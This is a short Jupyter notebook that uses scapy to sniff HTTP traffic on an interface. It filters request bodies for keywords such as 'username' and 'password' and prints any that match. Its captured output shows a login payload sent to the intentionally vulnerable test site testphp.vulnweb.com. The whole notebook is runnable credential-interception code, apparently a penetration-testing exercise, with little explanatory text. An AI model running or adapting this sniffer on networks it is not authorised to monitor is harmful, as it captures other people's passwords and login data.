{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Define keywords in payload to intercept"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scapy.all as scapy\n",
    "import scapy_http.http as http"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "keywords = ['username','user','password','pass','login']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Define our callback function to process packet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def extract_info(packet):\n",
    "    if packet.haslayer(http.HTTPRequest):\n",
    "        method = packet[http.HTTPRequest].Method.decode()\n",
    "        host = packet[http.HTTPRequest].Host.decode()\n",
    "        path = packet[http.HTTPRequest].Path.decode()\n",
    "        print('{} {} {}'.format(method,host,path))\n",
    "\n",
    "        if packet.haslayer(scapy.Raw):\n",
    "            load = packet[scapy.Raw].load.decode()\n",
    "            for word in keywords:\n",
    "                if word in load:\n",
    "                    print('payload: {}'.format(load))\n",
    "                    break\n",
    "\n",
    "        print()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Sniff traffic flow through the iface 'eth0'\n",
    "\n",
    "can use `scapy.ifaces` to identify available interfaces in windows"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "POST testphp.vulnweb.com /userinfo.php\n",
      "payload: uname=helloworld&pass=1234\n",
      "\n",
      "GET testphp.vulnweb.com /login.php\n",
      "\n",
      "GET testphp.vulnweb.com /style.css\n",
      "\n",
      "GET testphp.vulnweb.com /Flash/add.swf\n",
      "\n",
      "GET testphp.vulnweb.com /images/logo.gif\n",
      "\n",
      "GET testphp.vulnweb.com /favicon.ico\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "scapy.sniff(iface='eth0', store=False, prn=extract_info, filter='port 80')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
